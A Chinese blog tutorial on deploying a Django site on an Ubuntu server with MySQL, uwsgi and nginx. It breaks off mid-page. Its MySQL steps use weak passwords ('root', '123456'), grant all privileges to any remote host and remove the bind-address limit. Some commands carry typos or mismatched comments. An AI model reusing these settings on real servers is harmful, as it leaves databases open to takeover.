      <url>/2018/05/18/Django%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%9C%A8ubuntu%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A/</url>
      
        <content type="html"><![CDATA[<p>本人用到是阿里云ubuntu14.04的服务器，需要在Ubuntu中配置好自己的Django运行环境，然后用uwsgi和nginx帮助完成网站的部署。</p><a id="more"></a><blockquote><p><strong>要注意alias和root的区别</strong></p><p><code>root /path</code>相当于访问static的时候是访问<code>/path/static</code></p><p><code>alias /path</code>相当于访问static时是访问<code>/path/</code> </p></blockquote><h1 id="建立运行环境"><a href="#建立运行环境" class="headerlink" title="建立运行环境"></a><center>建立运行环境</center></h1><h2 id="建立Python虚拟环境"><a href="#建立Python虚拟环境" class="headerlink" title="建立Python虚拟环境"></a>建立Python虚拟环境</h2><p>关于Ubuntu下建立Python的虚拟环境的操作，详细查看此篇文章</p><blockquote><p><a href="http://wuliekun.me/2018/05/16/Linux%E4%B8%8Bpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">http://wuliekun.me/2018/05/16/Linux%E4%B8%8Bpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</a></p></blockquote><p><strong>说明：</strong>本人用到 是Python3.4与DJango1.9.1</p><blockquote><p>系统各种库和插件的安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># pip show 插件名称       #可以显示插件信息</span><br><span class="line"></span><br><span class="line">pip install django&#x3D;&#x3D;1.9.1</span><br><span class="line">pip install pycharm</span><br><span class="line">pip install xadmin</span><br><span class="line">pip install future</span><br><span class="line">pip install six</span><br><span class="line">pip install httplib2</span><br><span class="line">pip install django-import-export</span><br><span class="line">pip install pillow</span><br><span class="line">pip install requests</span><br><span class="line">pip install django-simple-captcha</span><br><span class="line">pip install django-pure-pagination</span><br></pre></td></tr></table></figure><p><strong>注意：</strong>DjangoUeditor 目前官方的不支持Python3,所以要去github中去下载Pyhton3的。</p><p>由于我widows下已经安装好了这个包。</p><p>所以我的做法是将我windows下的<code>F:\Tools\python3.4\Lib\site-packages\DjangoUeditor</code>所有的文件上传到Ubuntu虚拟环境<code>env3.4</code>对应的<code>/root/.virtualenvs/env3.4/lib/python3.4/site-packages</code>中，这样就大功告成</p></blockquote><h2 id="MySQL的安装和配置"><a href="#MySQL的安装和配置" class="headerlink" title="MySQL的安装和配置"></a>MySQL的安装和配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install mysql-server</span><br><span class="line">apt-get isntall mysql-client</span><br><span class="line">sudo apt-get install libmysqlclient-dev</span><br><span class="line"></span><br><span class="line"># 安装过程中会提示设置密码什么的，注意设置了不要忘了，安装完成之后可以使用如下命令来检查是否安装成功：</span><br><span class="line"></span><br><span class="line">sudo netstat -tap | grep mysql</span><br><span class="line"></span><br><span class="line"># 通过上述命令检查之后，如果看到有mysql 的socket处于 listen 状态则表示安装成功。</span><br><span class="line"></span><br><span class="line"># 登陆mysql数据库可以通过如下命令：</span><br><span class="line"></span><br><span class="line">mysql -u root -p</span><br><span class="line"></span><br><span class="line"># -u 表示选择登陆的用户名， -p 表示登陆的用户密码，上面命令输入之后会提示输入密码，此时输入密码就可以登录到mysql。</span><br><span class="line"></span><br><span class="line"># 启动MySQL服务</span><br><span class="line"># 启动文件在&#x2F;usr&#x2F;sbin&#x2F;mysqld</span><br><span class="line">service mysqld start</span><br></pre></td></tr></table></figure><h3 id="设置MySQL的root用户设置密码"><a href="#设置MySQL的root用户设置密码" class="headerlink" title="设置MySQL的root用户设置密码"></a><strong>设置MySQL的root用户设置密码</strong></h3><blockquote><p>登录数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root </span><br></pre></td></tr></table></figure><p>查看数据库用户名和密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user,host,password from mysql.user;</span><br></pre></td></tr></table></figure><p>可以看到用户名root的密码为空，用下面的命令设置root的密码为root </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set password for root@localhost&#x3D;password(&#39;root&#39;);  </span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>然后用新密码登录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p  </span><br><span class="line">Enter password: </span><br></pre></td></tr></table></figure></blockquote><h3 id="查看mysql默认存储引擎-保证储引擎是InnoDB，因为InnoDB引擎才支持事务"><a href="#查看mysql默认存储引擎-保证储引擎是InnoDB，因为InnoDB引擎才支持事务" class="headerlink" title="查看mysql默认存储引擎,保证储引擎是InnoDB，因为InnoDB引擎才支持事务"></a><strong>查看mysql默认存储引擎,保证储引擎是InnoDB，因为InnoDB引擎才支持事务</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p  </span><br><span class="line">Enter password:   </span><br><span class="line">show variables like &#39;storage_engine&#39;;  </span><br></pre></td></tr></table></figure><h3 id="开放-修改3306端口、开放访问权限"><a href="#开放-修改3306端口、开放访问权限" class="headerlink" title="开放/修改3306端口、开放访问权限"></a>开放/修改3306端口、开放访问权限</h3><blockquote><p>查看是否开放了3306端口号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nestat -an | grep 3306</span><br></pre></td></tr></table></figure><p>然后进入<code>/etc/mysql/my.cnf </code>中将</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bind-address    &#x3D;127.0.0.1 # 这行代码注释掉</span><br></pre></td></tr></table></figure></blockquote><p>这个时候准备在windows下远程登录Ubuntu下的mysql，出现了错误（我靠）,我以为防火墙原因，<code>service ufw status</code>显示<code>ufw stop/waiting</code></p><blockquote><p><strong>1130-host . is not allowed to connect to this MySql server,</strong> </p><p>其实这个问题的主要原因是没有授予远程登录权限</p></blockquote><h3 id="mysql远程登录配置"><a href="#mysql远程登录配置" class="headerlink" title="mysql远程登录配置"></a>mysql远程登录配置</h3><h4 id="创建新用户aliyun，远程登录mysql"><a href="#创建新用户aliyun，远程登录mysql" class="headerlink" title="创建新用户aliyun，远程登录mysql"></a><strong>创建新用户aliyun，远程登录mysql</strong></h4><blockquote><p><strong>create user ‘用户名‘@’IP地址’ identified by ‘密码’;  创建一个用户</strong></p><p><strong>%表示任意ip</strong></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create user &#39;aliyun&#39;@&#39;%&#39; identified by &#39;123456&#39;;</span><br></pre></td></tr></table></figure><h4 id="给新用户授权登陆外部和本地"><a href="#给新用户授权登陆外部和本地" class="headerlink" title="给新用户授权登陆外部和本地"></a><strong>给新用户授权登陆外部和本地</strong></h4><blockquote><p><strong>grant all privileges(除授权外的所有权限) on *.*(表示所有数据库的所有表) to ‘test_user(授权的用户名)‘@’localhost(授权ip)’ identified by ‘test_user(用户密码)’;</strong> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant all privileges on *.* to &#39;aliyun&#39;@&#39;localhost&#39; identified by &#39;123456&#39;;</span><br></pre></td></tr></table></figure><p><strong>grant all privileges(除授权外的所有权限) on <em>.</em>(表示所有数据库的所有表) to ‘test_user(授权的用户名)‘@’%(所有ip)’identified by ‘test_user(用户密码)’;</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant all privileges on *.* to &#39;aliyun&#39;@&#39;%&#39; identified by &#39;123456&#39;;</span><br></pre></td></tr></table></figure></blockquote><h4 id="查看用户授权后的情况"><a href="#查看用户授权后的情况" class="headerlink" title="查看用户授权后的情况"></a><strong>查看用户授权后的情况</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select user,host,password from mysql.user;</span><br><span class="line">+-----------+-----------------+-------------------------------------------+</span><br><span class="line">| user      | host            | password                                  |</span><br><span class="line">+-----------+-----------------+-------------------------------------------+</span><br><span class="line">| root      | localhost       | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">| root      | 192.168.158.128 |                                           |</span><br><span class="line">| root      | 127.0.0.1       |                                           |</span><br><span class="line">| root      | ::1             |                                           |</span><br><span class="line">|           | localhost       |                                           |</span><br><span class="line">|           | 192.168.158.128 |                                           |</span><br><span class="line">| aliyun | %               | *8A447777509932F0ED07ADB033562027D95A0F17 |</span><br><span class="line">| aliyun | localhost       | *8A447777509932F0ED07ADB033562027D95A0F17 |</span><br><span class="line">+-----------+-----------------+-------------------------------------------+</span><br><span class="line">8 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h4 id="使用授权用户远程登陆"><a href="#使用授权用户远程登陆" class="headerlink" title="使用授权用户远程登陆"></a><strong>使用授权用户远程登陆</strong></h4><p><img src="/2018/05/18/Django%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%9C%A8ubuntu%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A/Image.png"></p><p> 可以远程登陆了 </p><h1 id="网站数据库创建"><a href="#网站数据库创建" class="headerlink" title="网站数据库创建"></a><center>网站数据库创建</center></h1><h2 id="创建mxonline数据库"><a href="#创建mxonline数据库" class="headerlink" title="创建mxonline数据库"></a>创建<code>mxonline</code>数据库</h2><p><img src="/2018/05/18/Django%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%9C%A8ubuntu%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A/1.png"></p><h2 id="数据库数据传输"><a href="#数据库数据传输" class="headerlink" title="数据库数据传输"></a>数据库数据传输</h2><p>选中<code>mxonline</code>，右击选择<code>数据传输</code></p><p><img src="/2018/05/18/Django%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%9C%A8ubuntu%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A/Image3.png"></p><blockquote><p><strong>如果在传输数据时，怎么都传输不了，老报错误，有可能是传输数据太大，要在软件设置一下，改一个变量，将参数调大</strong> </p></blockquote><p><img src="/2018/05/18/Django%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%9C%A8ubuntu%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A/2.png"></p><h2 id="Django项目上传"><a href="#Django项目上传" class="headerlink" title="Django项目上传"></a>Django项目上传</h2><p><strong>数据库数据传输好后，将开发环境里的整个Django项目，上传到Linux系统里准备好的python虚拟环境里的网站安装目录里，</strong></p><p><strong>在虚拟环境里创建一个网站目录，目录里包含两个文件夹，一个是Django项目，一个是创建来专门放配置文件的目录</strong></p><p><img src="/2018/05/18/Django%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%9C%A8ubuntu%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A/3.png"></p><p><strong>上传好项目后，检查Django项目里的<code>settings.py</code>配置文件，配置数据库相关信息链接刚才导入的数据库，检查用户名密码是否正确，连接数据库的用户名，必须有操作当前网站数据库的权限，和当前用户可以任意ip访问数据库权限</strong> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># mysql数据库</span><br><span class="line"></span><br><span class="line">DATABASES &#x3D; &#123;</span><br><span class="line">    &#39;default&#39;: &#123;</span><br><span class="line">        &#39;ENGINE&#39;: &#39;django.db.backends.mysql&#39;,</span><br><span class="line">        &#39;NAME&#39;: &quot;mxonline&quot;,</span><br><span class="line">        &#39;USER&#39;: &#39;aliyun&#39;,</span><br><span class="line">        &#39;PASSWORD&#39;: &#39;123456&#39;,</span><br><span class="line">        &#39;HOST&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">        &#39;OPTIONS&#39;: &#123;</span><br><span class="line">            &quot;init_command&quot;: &quot;SET foreign_key_checks &#x3D; 0;&quot;,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p><strong>注意：**</strong>在Linux系统的opt目录创建Python虚拟环境，一般虚拟环境创建在opt目录不然会有权限问题** </p></blockquote><h2 id="测试Django项目项目是否能够运行"><a href="#测试Django项目项目是否能够运行" class="headerlink" title="测试Django项目项目是否能够运行"></a><strong>测试Django项目项目是否能够运行</strong></h2><li>**执行命令进入虚拟环境** </li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">workon env3.4</span><br><span class="line"></span><br><span class="line"># 在虚拟环境里cd到Django根项目</span><br><span class="line"></span><br><span class="line">cd &#x2F;var&#x2F;www&#x2F;Python_project&#x2F;StudyOnline&#x2F;</span><br><span class="line">ls</span><br><span class="line">apps  courses  extra_apps  manage.py  media  static  StudyOnline  templates</span><br><span class="line"></span><br></pre></td></tr></table></figure><li>**执行命令，从manage.py启动Django项目** </li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">python manage.py runserver</span><br><span class="line"></span><br><span class="line">Performing system checks...</span><br><span class="line"></span><br><span class="line">System check identified no issues (0 silenced).</span><br><span class="line"></span><br><span class="line">You have 1 unapplied migration(s). Your project may not work properly until you apply the migrations for app(s): reversion.</span><br><span class="line">Run &#39;python manage.py migrate&#39; to apply them.</span><br><span class="line"></span><br><span class="line">October 07, 2017 - 01:07:13</span><br><span class="line">Django version 1.10, using settings &#39;MxOnline.settings&#39;</span><br><span class="line">Starting development server at http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;</span><br><span class="line">Quit the server with CONTROL-C.</span><br></pre></td></tr></table></figure><p><strong>可以看到项目已经启动，可以访问<a href="http://127.0.0.1:8000/">http://127.0.0.1:8000/</a></strong> </p><blockquote><p>服务器中没有服务器，怎么才能证明运行没有问题呢？</p></blockquote><p>使用命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;</span><br></pre></td></tr></table></figure><blockquote><p>如果返回<code>HTTP/1.1 200 OK</code>,说明是成功的</p></blockquote><p><img src="/2018/05/18/Django%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%9C%A8ubuntu%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A/4.png"></p><blockquote><p><strong>以上测试Django项目可以远行，这只是测试一下，正真的生产中不是从manage.py启动Django项目，而是用uwsgi模块来启动，所以以上只是为uwsgi做准备，至此在终端按ctrl+c键停止Django项目</strong> </p></blockquote><h1 id="uwsgi-nginx【主题】"><a href="#uwsgi-nginx【主题】" class="headerlink" title="uwsgi+nginx【主题】"></a>uwsgi+nginx【主题】</h1><p>这是一张关系图</p><p><img src="/2018/05/18/Django%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%9C%A8ubuntu%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A/5.png"></p><blockquote><p>采用<code>uwsgi+nginx</code>来部署Django。</p><p>这种方式是将<code>nginx</code>作为服务器<code>前端</code>，将接受web所有的请求，统一管理。Nginx把所有的静态请求自己处理（静态文件处理是nginx强项）,然后把所有<code>非静态</code>请求通过<code>uwsgi</code>传递给<code>Django</code>，由Django来处理，从而完成一次web请求。</p></blockquote><h2 id="uwsgi"><a href="#uwsgi" class="headerlink" title="uwsgi"></a>uwsgi</h2><p>uwsgi.jpg</p><p>uwsgi的启动可以把参数加载命令行中，也可以是配置文件 .ini, .xml, .yaml 配置文件中，个人用的比较多得是 .ini 文件。<br> 通过<code>uwsgi --help</code>可以查看得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-x|--xmlconfig                         load config from xml file</span><br><span class="line">-x|--xml                               load config from xml file</span><br><span class="line">--ini                                  load config from ini file</span><br><span class="line">-y|--yaml                              load config from yaml file</span><br><span class="line">-y|--yml                               load config from yaml file</span><br></pre></td></tr></table></figure><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ps -ef|grep -i uwsgi              #查看uwsgi启动进程</span><br><span class="line">pkill -9 nginx                   #杀掉uwsgi启动进程</span><br><span class="line">uwsgi                            # 启动uwsgi</span><br><span class="line"></span><br><span class="line">uwsgi --ini uwsgi.ini             # 启动</span><br><span class="line">uwsgi --reload uwsgi.pid          # 重启</span><br><span class="line">uwsgi --stop uwsgi.pid            # 关闭</span><br><span class="line"></span><br><span class="line">uwsgi --connect-and-read uwsgi&#x2F;uwsgi.status  # 读取uwsgi实时状态</span><br></pre></td></tr></table></figure><h3 id="uwsgi常用选项"><a href="#uwsgi常用选项" class="headerlink" title="uwsgi常用选项"></a>uwsgi常用选项</h3><p><code>socket</code>: 地址和端口号，例如：socket = 127.0.0.1:50000 </p><p><code>processes</code>： 开启的进程数量 </p><p><code>workers</code>：开启的进程数量，等同于processes（官网的说法是spawn the specified number of  <strong>workers / processes</strong>） </p><p><code>ckdir</code> ：指定运行目录（chdir to specified directory before apps loading） </p><p><code>wsgi-file</code> :载入wsgi-file（load .wsgi file） 表示要运行的wsgi应用程序文件 </p><p><code>stats</code> :  在指定的地址上，开启状态服务（enable the stats server on the specified address） </p><p><code>threads</code>:  运行线程。由于GIL的存在，我觉得这个真心没啥用。（run each worker in prethreaded mode with the specified number of threads） </p><p><code>master</code> :  允许主进程存在（enable master process） </p><p><code>daemonize</code>:  使进程在后台运行，并将日志打到指定的日志文件或者udp服务器（daemonize uWSGI）。实际上最常用的，还是把运行记录输出到一个本地文件上。 </p><p><code>log-maxsize</code>: 以固定的文件大小（单位KB），切割日志文件。 例如：log-maxsize = 50000000  就是50M一个日志文件。 </p><p><code>pidfile</code> : 指定pid文件的位置，记录主进程的pid号。 </p><p><code>vacuum</code> : 当服务器退出的时候自动清理环境，删除unix socket文件和pid文件（try to remove all of the generated file/sockets） </p><p><code>disable-logging</code> : 不记录请求信息的日志。只记录错误以及uWSGI内部消息到日志中。如果不开启这项，那么你的日志中会大量出现这种记录</p><p><code> static</code> :做一个映射,指定静态文件</p><p><code>max-requests</code> ： 一个工作进程最大请求数</p><p><code>harakiri</code>: 一个请求超时时间</p><p><code>set</code> : 设置一个占位符 </p><p><code>include</code> : 包含指定的文件作为立即配置 </p><p><code>module</code> : 加载一个WSGI模块 </p><p><code>wsgi</code> : 加载一个WSGI模块 </p><h3 id="虚拟环境中安装uwsgi"><a href="#虚拟环境中安装uwsgi" class="headerlink" title="虚拟环境中安装uwsgi"></a>虚拟环境中安装uwsgi</h3><p><strong><code>uwsgi</code>是Python写的一个模块，能启动Django项目，它的角色就是处理网站的<code>动态请求</code></strong> </p><center>**uwsgi的主要特点如下：**</center><p>1：<strong>超快的性能。</strong></p><p>2：<strong>低内存占用（实测apache的mod_wsgi的一半左右）</strong></p><p>3：<strong>多app管理</strong></p><p>4：<strong>详尽的日志功能（可以用来分析app性能和瓶颈）</strong></p><p>5：<strong>高度可定制（内存大小限制，服务一定次数后重启等）</strong></p><p><strong>安装：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install uwsgi</span><br></pre></td></tr></table></figure><p>但是安装错误</p><blockquote><p>Failed building wheel for uwsgi</p></blockquote><p>解决办法为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python3.5-dev</span><br><span class="line">pip install uwsgi</span><br><span class="line"># 这样问题就解决了</span><br></pre></td></tr></table></figure><h3 id="测试uWSGI是否安装成功并测试uwsgi启动Django项目"><a href="#测试uWSGI是否安装成功并测试uwsgi启动Django项目" class="headerlink" title="测试uWSGI是否安装成功并测试uwsgi启动Django项目"></a><strong>测试uWSGI是否安装成功并测试uwsgi启动Django项目</strong></h3><p> 在终端中输入以下命令查看uwsgi的版本号，如果输出正常，说明uswgi已安装成功 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uwsgi --version</span><br><span class="line">2.0.15</span><br></pre></td></tr></table></figure><p><strong>首先cd 进入到Django项目里，在此目录下执行命令</strong> </p><blockquote><p><strong>uwsgi –http 127.0.0.1:8000 –module StudyOnline.wsgi(wsgi.py路径) –static-map=/static=static(静态文件路径)</strong> </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uwsgi --http 127.0.0.1:8000 --module StudyOnline.wsgi --static-map&#x3D;&#x2F;static&#x3D;static</span><br></pre></td></tr></table></figure><h3 id="使用配置文件启动uwsgi【ini】"><a href="#使用配置文件启动uwsgi【ini】" class="headerlink" title="使用配置文件启动uwsgi【ini】"></a>使用配置文件启动uwsgi【ini】</h3><p>在网站安装目录里与Django项目同级我们创建一个<code>peizhi</code>文件夹，来专门存放配置文件</p><p><img src="/2018/05/18/Django%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%9C%A8ubuntu%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A/6.png"></p><p><strong>在配置文件夹下创建 网站名称_uwsgi.ini文件，来写uWSGI的配置文件</strong> </p><p>创建<code>StudyOnline_uwsgi.ini</code>文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># uwsgi.ini</span><br><span class="line">[uwsgi]</span><br><span class="line"></span><br><span class="line"># 指定Django项目的根目录</span><br><span class="line">chdir           &#x3D; &#x2F;var&#x2F;www&#x2F;Python_project&#x2F;StudyOnline&#x2F;</span><br><span class="line"></span><br><span class="line"># 指定Django项目里的wsgi.py文件路径，上面已经指定了根目录，这里拼接根目录即可</span><br><span class="line">module          &#x3D; StudyOnline.wsgi</span><br><span class="line"></span><br><span class="line"># 启用主进程</span><br><span class="line">master          &#x3D; true</span><br><span class="line"></span><br><span class="line"># 设置启动进程最大数</span><br><span class="line">processes       &#x3D; 10</span><br><span class="line"></span><br><span class="line"># 设置监听端口</span><br><span class="line">socket          &#x3D; 127.0.0.1:8000</span><br><span class="line"></span><br><span class="line"># 自动移除unix Socket和pid文件当服务停止的时候</span><br><span class="line">vacuum          &#x3D; true</span><br><span class="line"></span><br><span class="line"># 设置python虚拟环境</span><br><span class="line">virtualenv &#x3D; &#x2F;root&#x2F;.virtualenvs&#x2F;env3.4</span><br><span class="line"></span><br><span class="line"># 设置uwsgi日志保存路径，一般设置到当前配置文件所在目录</span><br><span class="line">logto &#x3D; &#x2F;var&#x2F;www&#x2F;Python_project&#x2F;peizhi&#x2F;uwsgi.log</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>创建好uWSGI的配置文件后，cd 进入到当前<code>StudyOnline_uwsgi.ini</code>配置文件目录，执行启动uwsgi命令</strong> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">uwsgi --ini StudyOnline_uwsgi.ini &amp;         启动uwsgi配置文件</span><br><span class="line">[uWSGI] getting INI configuration from jxiou_uwsgi.ini</span><br><span class="line"> ps -ef|grep -i uwsgi　　　　　　　　　　查看uwsgi启动进程</span><br><span class="line"> root     43159     1  1 03:50 ?        00:00:01 uwsgi --ini jxiou_uwsgi.ini</span><br><span class="line">root     43164 43159  0 03:50 ?        00:00:00 uwsgi --ini jxiou_uwsgi.ini</span><br><span class="line">root     43165 43159  0 03:50 ?        00:00:00 uwsgi --ini jxiou_uwsgi.ini</span><br><span class="line">root     43166 43159  0 03:50 ?        00:00:00 uwsgi --ini jxiou_uwsgi.ini</span><br><span class="line">root     43167 43159  0 03:50 ?        00:00:00 uwsgi --ini jxiou_uwsgi.ini</span><br><span class="line">root     43168 43159  0 03:50 ?        00:00:00 uwsgi --ini jxiou_uwsgi.ini</span><br><span class="line">root     43185 14898  0 03:51 pts&#x2F;1    00:00:00 grep -i uwsgi</span><br></pre></td></tr></table></figure><h2 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h2><h3 id="安装并检查nginx是否安装、运行成功"><a href="#安装并检查nginx是否安装、运行成功" class="headerlink" title="安装并检查nginx是否安装、运行成功"></a>安装并检查nginx是否安装、运行成功</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nginx        #安装</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;nginx start        #启动</span><br><span class="line">[ ok ] Starting nginx (via systemctl): nginx.service.</span><br><span class="line"></span><br><span class="line">ps -ef|grep -i nginx         # 运行情况</span><br><span class="line">root       6961      1  0 03:56 ?        00:00:00 nginx: master process &#x2F;usr&#x2F;sbin&#x2F;nginx -g daemon on; master_process on;</span><br><span class="line">www-data   6962   6961  0 03:56 ?        00:00:00 nginx: worker process</span><br><span class="line">pala       6985   2090  0 03:57 pts&#x2F;0    00:00:00 grep --color&#x3D;auto -i nginx</span><br></pre></td></tr></table></figure><p>Nginx安装好后，<strong>Nginx的启动文件在<code> /usr/sbin/nginx</code>    执行此文件即可启动Nginx。</strong></p><p><img src="/2018/05/18/Django%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%9C%A8ubuntu%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A/8.png"></p><p><code>/etc/nginx/conf.d </code>  这个目录为Nginx配置文件启动目录，当Nginx启动时会自动启动目录里的conf文件** .</p><p><img src="/2018/05/18/Django%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%9C%A8ubuntu%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A/9.png"></p><p> 然后打开浏览器，访问ip地址，出现如下页面即代表nginx安装完成且可以正常启动。 </p><p><img 